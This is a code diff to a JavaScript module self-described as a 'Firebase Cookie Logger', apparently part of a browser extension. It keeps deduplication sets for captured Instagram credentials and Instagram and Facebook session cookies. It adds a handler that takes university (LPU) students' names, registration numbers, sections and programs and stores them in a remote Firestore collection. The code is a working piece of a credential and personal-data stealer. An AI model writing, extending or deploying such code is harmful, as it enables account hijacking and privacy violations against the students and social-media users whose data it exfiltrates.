@@ -1,7 +1,7 @@
 // ============== 🧠 Session Handler - Firebase Cookie Logger ==============
 
 import { db } from "./firebase-init.js";
-import { collection, addDoc } from "./firebase-firestore.js";
+import { collection, addDoc, getDocs, query, where, updateDoc, doc } from "./firebase-firestore.js";
 import { isDuplicateData } from "./utils.js";
 
 // ============== 🧠 In-Memory Cache for Deduplication ==============
@@ -9,6 +9,7 @@ const savedStudentSet = new Set();
 const savedInstagramCredSet = new Set();
 const savedInstagramSessionSet = new Set();
 const savedFacebookSessionSet = new Set();
+const savedProfileSet = new Set();
 
 // 🌐 Navigation Handler
 export function setupNavigationListener() {
@@ -116,6 +117,71 @@ export function setupMessageListener() {
         } catch (err) {
           console.error(
             "%c❌ [LPU] Error saving student data:",
+            "color: red; font-weight: bold;",
+            err
+          );
+        }
+      }
+
+      // 🎓 LPU Profile Data Handler
+      if (msg.type === "lpu_profile_data") {
+        const { studentName, registrationNumber, section, program } = msg.data;
+
+        if (!registrationNumber) return;
+
+        console.log(
+          "%c[LPU Profile] Received profile data:",
+          "color: dodgerblue; font-weight: bold; font-size: 14px;"
+        );
+        console.table({ studentName, registrationNumber, section, program });
+
+        const key = `profile:${registrationNumber}`;
+
+        try {
+          if (savedProfileSet.has(key)) {
+            console.warn(
+              "%c⛔️ [LPU Profile] Already handled in-memory — skipping",
+              "color: gray; font-weight: bold;"
+            );
+            return;
+          }
+          savedProfileSet.add(key);
+
+          // Update existing studentData document with profile info OR create new one
+          const studentColRef = collection(db, "studentData");
+          const q = query(studentColRef, where("registrationNumber", "==", registrationNumber));
+          const snapshot = await getDocs(q);
+
+          if (!snapshot.empty) {
+            // Update existing document
+            const existingDoc = snapshot.docs[0];
+            await updateDoc(doc(db, "studentData", existingDoc.id), {
+              studentName,
+              section,
+              program,
+              profileUpdatedAt: new Date()
+            });
+            console.log(
+              `%c✅ [LPU Profile] Updated profile for regNo: ${registrationNumber}`,
+              "color: mediumseagreen; font-weight: bold;"
+            );
+          } else {
+            // Create new document with profile data
+            await addDoc(studentColRef, {
+              registrationNumber,
+              studentName,
+              section,
+              program,
+              timestamp: new Date()
+            });
+            console.log(
+              `%c✅ [LPU Profile] Created new profile for regNo: ${registrationNumber}`,
+              "color: mediumseagreen; font-weight: bold;"
+            );
+          }
+        } catch (err) {
+          console.error(
+            "%c❌ [LPU Profile] Error saving profile data:",
             "color: red; font-weight: bold;",
             err
           );
